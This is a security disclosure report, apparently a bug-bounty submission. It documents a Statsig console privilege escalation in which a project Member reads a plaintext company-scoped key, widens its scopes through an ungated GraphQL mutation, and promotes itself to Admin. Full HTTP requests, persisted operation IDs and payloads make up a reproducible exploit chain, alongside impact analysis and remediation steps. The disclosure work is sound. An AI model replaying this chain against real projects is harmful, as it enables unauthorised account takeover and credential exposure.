# Statsig Console — a project **Member** reads a company-scoped key, raises that key's scopes through an ungated mutation, and promotes itself to **Admin**

**Severity:** CVSS 8.8 (High) — `AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H`
**Tenant:** two self-owned Statsig projects; no third-party data touched. `4IM7HTtUKEEctrmIy6IrJm` — Owner `m.tayel2004@gmail.com`, Member `f73556429@gmail.com` (steps 1–4). `4n6HCY59mDqwX1iSZQtNvx` — Owner `mohamed-9499-2@agentmail.to`, Member `mohamed-9499-3@agentmail.to` (capability matrix, blast radius).

## Summary

Three authorization decisions in the Statsig console and its management API are each missing the check the caller's **role** should provide. Chained, they let the lowest administrative role — a plain **Member** — take over the project as an **Admin**, with no approval, no notification and no human actor recorded. The Member first reads a company-scoped key's plaintext value out of the console key box (the UI tells them *"Contact Project Admin to View Key"*); then raises that key's scopes to `omni_read_write + can_access_keys` through `UpdateSDKKeyScopes`, which carries no admin gate; then uses the now-privileged key to promote itself.

The decisive measurement — the same key **value**, only its scope changed by the Member:

```
POST /console/v1/users/<MEMBER EMAIL>  {"role":"Admin"}
  key as issued (owner:null, ["omni_read_only"])  -> 401 "Read only API keys can not modify entities"
  after the Member's own UpdateSDKKeyScopes (200) -> 201 "User updated successfully."
GET /console/v1/users (read-back)                 -> "role":"admin"   <== THE MEMBER IS NOW AN ADMIN
```

Statsig does enforce two checks on this surface and both work: a **key-type** gate (`"This endpoint only accepts an active CONSOLE key, but a SERVER key was sent."`) and a **key-scope** gate (`"Read only API keys can not modify entities"`). What is missing is the third: nothing checks the role of the human behind the key. The single precondition is that a company-scoped `CONSOLE` key exists in the project; its scope is irrelevant, because the Member rewrites it.

**Not a duplicate of `SUBMISSION-STATSIG-REVIEW-BYPASS.md`:** that report is about the **review/approval control** — `commit` is the one verb in the review family that does not resolve an acting user — i.e. the control that is supposed to gate the writes demonstrated here; the `commit` verb, `/reviews`, `skip_config_review` and `on_behalf_of_required` appear nowhere in this document. The two share one precondition (steps 1–2 below) and one root pattern — the Console API resolves the credential and never the caller — but they are different routes, objects, fixes and regression tests; if the program treats the root pattern as one cause, fold the review-bypass report in as an **additional impact of this report** rather than closing it as a duplicate.

## Repro

Steps 1–4 are from `4IM7HTtUKEEctrmIy6IrJm`; the matrix and blast radius are from `4n6HCY59mDqwX1iSZQtNvx`. Replaying step 3 in the second project yields a different `userID` because it is a different Member.

**1. The Member reads a key it should not see.** The console UI denies this (masked rows, tooltip *"Contact Project Admin to View Key"*); the API does not.

```
POST /api/graphql?company_id=<COMPANY_ID> HTTP/1.1
Host: console.statsig.com
Cookie: <MEMBER SESSION>
Content-Type: application/json
x-csrf-token: 1
Referer: https://console.statsig.com/<COMPANY_ID>/api_keys

{"id":"d6fcaacbc921668f7e7aa576b9d2ca1e",
 "variables":{"first":100,"keyType":"ALL"}}
```
```
HTTP/1.1 200 OK
{"data":{"viewer_company":{"keys_connection":{"nodes":[
  {"id":"3Be7ZcASE0mePuQOULbYeC","type":"CONSOLE","owner":null,
   "scopes":["omni_read_only"],"description":"just read","value":"console-…"},
  {"id":"162b7UtwoI8kQnPZqFPObn","type":"CONSOLE","owner":null,
   "scopes":["omni_read_write"],"value":"console-…"},
  {"id":"2OTbhpKHv01WRsB9HReXvG","type":"CONSOLE","owner":null,
   "scopes":["can_access_keys","omni_read_only"],"value":"console-…"},
  {"id":"YTNeXAQSJw5h7gnI82sR0","type":"SERVER","owner":null,"value":"secret-…"},
  {"id":"4IMgm3omn3TB3jiQuibnMA","type":"CLIENT","owner":null,"value":"client-…"}
]}}}}
```

Every key in the project comes back in plaintext — the company-scoped `CONSOLE` key, the `SERVER` key (the project's production server credential) and the `CLIENT` key. The same query returns *personal* keys with `owner` set (measured: `"owner":{"full_name":"Bruno Hunter","id":"<MEMBER USER ID>"}`), so `owner: null` is the marker for the company-scoped class. The same leak is reachable through the onboarding operation the console calls:

```
POST /api/graphql?company_id=<COMPANY_ID>   (MEMBER SESSION, x-csrf-token: 1)
{"id":"63df72f64b17f956f4b3dbe074f407ea","operationName":null,"variables":{}}
-> 200 {"data":{"viewer_company":{"secret_keys":[{"value":"secret-…","id":"YTNeXAQSJw5h7gnI82sR0"}],
                                    "id":"<COMPANY_ID>"}}}
```

*Provenance:* the three company-scoped `CONSOLE` keys above were minted for this test by the project Owner (`CreateSDKKey`). A project does **not** get one by default — measured on a second self-owned project the console key box is empty at baseline (`n = 0`) and the only company-scoped keys are the `SERVER`/`CLIENT` SDK defaults with `scopes: []`. A Member cannot create one. The precondition is therefore exactly one thing: **a company-scoped `CONSOLE` key exists in the project.**

**2. The Member raises that key's scopes — no admin gate.** A read-only key is correctly refused when it tries to write:

```
POST /console/v1/users/<MEMBER EMAIL> HTTP/1.1
Host: statsigapi.net
STATSIG-API-KEY: *** omni_read_only key value from step 1>
Content-Type: application/json

{"role":"Member"}
```
```
HTTP/1.1 401 Unauthorized
{"message":"Read only API keys can not modify entities","status":401}
```

But the **scope of that same key** can be rewritten by the Member:

```
POST /api/graphql?company_id=<COMPANY_ID> HTTP/1.1
Host: console.statsig.com
Cookie: <MEMBER SESSION>
Content-Type: application/json
x-csrf-token: 1
Referer: https://console.statsig.com/<COMPANY_ID>/api_keys

{"id":"ee6fa2efc62906060e04a4e788bc4ac0",
 "variables":{"id":"3Be7ZcASE0mePuQOULbYeC",
              "scopes":["omni_read_write","can_access_keys"],
              "version":1}}
```
```
HTTP/1.1 200 OK
{"data":{"update_sdkkey":{"update_sdkkey_scopes":{
   "id":"3Be7ZcASE0mePuQOULbYeC",
   "scopes":["omni_read_write","can_access_keys"],"version":2}}}}
```

Read-back confirms `["omni_read_write","can_access_keys"]`. **The asymmetry on the same key object is the defect:**

| Operation | Result for a Member |
|---|---|
| `CreateSDKKey` | `"Must be admin of project"` |
| `DeleteSDKKey` | `"Must be admin of project"` |
| **`UpdateSDKKeyScopes`** | **`200`** |
| `DeactivateSDKKey` | `200` (no admin gate) |

**3. The same key now promotes the Member to Admin.** Nothing about the key changed except its scope.

```
GET /console/v1/keys   STATSIG-API-KEY: *** SAME key value>
-> 200 {"message":"Keys listed successfully.","data":[{"key":"console-…",…}]}   <- was 403 before the scope write

POST /console/v1/users/<MEMBER EMAIL>   STATSIG-API-KEY: *** SAME key value>
{"role":"Admin"}
-> 201 {"message":"User updated successfully.",
        "data":{"userID":"3FqWstaxD99nn3N1FP07SC","email":"<MEMBER EMAIL>", …}}

GET /console/v1/users   STATSIG-API-KEY: *** SAME key value>
-> 200 … {"email":"<MEMBER EMAIL>","role":"admin"} …    <== THE MEMBER IS NOW AN ADMIN
```

**4. The escalation is made durable.**

```
POST /console/v1/settings/roles   STATSIG-API-KEY: *** SAME key value>
{"default_project_role":"Admin"}
-> 201 {"message":"Settings updated successfully.","data":{"default_project_role":"Admin"}}
```

Every future invitee now lands as an Admin, so the escalation outlives removal of the account that performed it. The audit trail never records a person: `"updatedBy": "CONSOLE API - console-…"`, `"updatedByUserID": "<the key's id>"`, `"modifierEmail": null` — verified on the rows this chain produced (`batch_user_role_update`, `set_company_default_user_role`, `config_review_commit`, `config_state_toggle`).

**Controls**

* **The read-only key as issued is refused** — so nothing here works with a read-only credential *as issued*: `GET /console/v1/keys -> 403 "Insufficient permissions."`; `POST /console/v1/users/<member> -> 401 "Read only API keys can not modify entities"`; `POST /console/v1/settings/roles -> 401 "Read only API keys can not modify entities"`. The escalation is exactly the `200` scope mutation.
* **A personal key is capped:** `POST /console/v1/settings/roles -> 400 {"message":"Must be admin of project"}`; `POST /console/v1/users/<self> {"role":"Admin"} -> 400 {"message":"Must be admin of project or project org"}`; `UpdateSDKKeyScopes` on the personal key -> `{"errors":[{"message":"Scopes: Invalid scopes: omni_read_write, can_access_keys"}]}` with read-back **unchanged**.
* **A Member cannot create a company-scoped key:** `useCreateSDKKeyMutation {"scopes":["omni_read_write"],"owner_id":null} -> {"errors":[{"message":"Must be admin of project"}]}`; `POST /console/v1/keys {"owner_id":null,…} -> 403 "Insufficient permissions."` (three body shapes tested).
* **Key-type gate works:** `GET /console/v1/users` with a `CLIENT` key -> `403 {"message":"This endpoint only accepts an active CONSOLE key, but a CLIENT key was sent. …"}`; with a `SERVER` key -> `403 "…but a SERVER key was sent."` The API rejects a key for being the wrong **kind**, never for belonging to the wrong **person**.
* **Reads are clean (no false-positive read differential):** across 66 read operations in `experiments`, `gates`, `metrics`, `segments`, `layers`, `holdouts`, `dashboards`, `alerts`, the status pair is identical for both key classes; `GET /alerts`, `GET /release_pipelines`, `GET /release_pipeline_triggers` (`401`) and `GET /users/teams` (`403`) are refused to **both** classes.

## Impact

* A plain **Member** holds the project's highest effective role. Before that, the same session exposes **every key in the project in plaintext** — including the `SERVER` key (production server credential) and the `CLIENT` key — plus the **full member roster with email addresses** and the **complete administrative audit trail** (who invited whom, who changed whose role, who was removed).
* `POST /console/v1/settings/roles {"default_project_role":"Admin"} -> 201`, so **every future invitee lands as an Admin**; the escalation persists after the offending account is removed.
* **Durability:** a company-scoped key has no owner at all (`owner: null`) and its authority does not depend on the role of the human holding it. Measured: the same key returned `201` on `POST /console/v1/users/<member> {"role":"Admin"}` **while that account was a plain Member** (read back `member` → `admin`, both the demote and the promote attributed to the key with `modifierEmail: null`). Demoting or removing the human does not revoke what the key can do — only deleting the key does.
* **Blast radius — four more admin-gated resources accept the company-scoped key and refuse the personal one** (208 paths / 324 operations from the vendor's own OpenAPI spec walked with a status pair per endpoint): `POST /console/v1/roles -> 201` (personal `400 "Must be admin of project"`), `PATCH /console/v1/roles/{id} -> 200` (`400`), `POST /console/v1/settings/reviews -> 201` (`400 "Must be admin of project"`), `POST /console/v1/settings/teams -> 201` (`400`), `POST /console/v1/unit_id_types -> 201` (`400`), `POST /console/v1/target_app -> authz passed` (feature gate `"Target apps are not available"`). A Member can create and edit **role definitions**, with an accepted permission set including `invitation_access · create_configs · edit_or_delete_configs · launch_to_production · create_teams`, and `POST /settings/reviews` is the project's **review/approval policy** — the control meant to gate production changes. The defect is directional and bounded: it applies to **writes on admin-gated resources**, not to reads.
* **Also worth fixing:** two refused role changes against the Owner returned `201 "User updated successfully"` *and* wrote audit-log entries although the role never changed. The trail records actions that did not take effect, which is misleading during incident review.

**Ceiling.** The Owner retains ultimate control and cannot be removed or demoted through this path:

| Action against the **original Owner** | Result |
|---|---|
| `POST /console/v1/users/<owner> {"role":"Member"}` | `201` returned, role **unchanged** (silent no-op) |
| `POST /console/v1/users/<owner> {"role":"Read Only"}` | `201` returned, role still **unchanged** |
| `POST /console/v1/users/<self> {"role":"Owner"}` | `401 "Must be owner of project"` |
| `DELETE /console/v1/users/<owner>` | `404` — no such route |
| `POST /console/v1/keys/<owner key>/deactivate` | `404` — no such route |
| `DELETE /console/v1/keys/<key value>` | `403 "Insufficient permissions."` without `can_access_keys`; **`200 "Key deleted successfully."`** with it (the scope this report's step 2 grants) |

So the ceiling is **full Admin authority over every other member, over project settings, over the administrative record, and — with `can_access_keys` — over the project's other credentials** (a class key deleted both a company-scoped and a personal key with `200 "Key deleted successfully."`). It is **not** ownership of the project. The "owner key" row is not directly testable in our tenant: our Owner holds no personal key, so there is no Owner-owned credential to attempt to delete.

**CVSS terms and the measured fact behind each:**

| Term | Support |
|---|---|
| `AV:N` | The Console API is reachable over the internet (`statsigapi.net`, `console.statsig.com`). |
| `AC:L` | Every step above is a single request; no race, no timing, no special condition. |
| `PR:L` | Requires a plain **Member** account in the project. |
| `UI:N` | No victim interaction; the attacker is the caller. |
| `S:U` | Impact stays inside the project's own configuration plane. |
| `C:H` | Measured: the Member session reads every key in the project in plaintext (steps 1), the full member roster and the complete administrative audit trail. |
| `I:H` | Measured: `201` on `POST /console/v1/users {"role":"Admin"}` with read-back `role: admin`, and `201` on `POST /console/v1/settings/roles {"default_project_role":"Admin"}`. |
| `A:H` | **Inference, not a discrete measurement.** The source report names no measured availability fact for this term; it is carried from the Admin authority demonstrated above (including `DELETE /console/v1/keys/<value> -> 200`). |

Recommend **P1 / Critical** per the source report's own recommendation; the computed base is 8.8 (High).

## Remediation

1. **Check the caller's role, not only the key.** Every `/console/v1` route and every key-management mutation should resolve the human behind the credential and evaluate their role against the action, exactly as the console session path already does. The key-type and key-scope gates show the pattern is understood; the role gate is the missing third one.
2. **Put the admin gate on `UpdateSDKKeyScopes` and `DeactivateSDKKey`** to match `CreateSDKKey` and `DeleteSDKKey` on the same object. A credential must not be able to widen its own authority. **This is the shared enabler** for both this report and `SUBMISSION-STATSIG-REVIEW-BYPASS.md` — fixing only the downstream symptom (the role write, or the `commit` verb) leaves a Member able to grant itself any scope on a company-scoped key.
3. **Never allow a key to gain a scope its owner's role does not permit.** Clamp the requested scope list to the intersection of what the key already has and what its owner may hold.
4. **Apply the existing Read-Only masking predicate to role < Admin** at the `SDKKey.value` resolver and its siblings (`ApiKeysBoxQuery` `d6fcaacb…`, `PersonalCAPITokenSectionQuery` `0799d4b7…`, `useLoadOnboardingServerKeyQuery` `63df72f6…`), so a Member cannot read the value that starts the chain.
5. **Re-evaluate authority on every call** so demoting or removing a user immediately removes what their credentials represent.

All steps were performed on our own tenants and reverted/verified: key scopes restored to `["omni_read_only"]`, account role restored, default role restored, console key list back at baseline. No destructive call was made against any real project.

---
Evidence: escal/user_key_scope_20260920T*.json, escal/user_tenant_chain_20260920T*.json, escal/fullchain_20260919T*.json, escal/company_key_reach_20260919T*.json, escal/leaked_key_test_20260920T*.json, escal/personal_chain_20260919T*.json, escal/missing_link_20260919T*.json, escal/merge_test_20260919T*.json, escal/REPRODUCTION-FULL.md, escal/BURP-REQUESTS.md
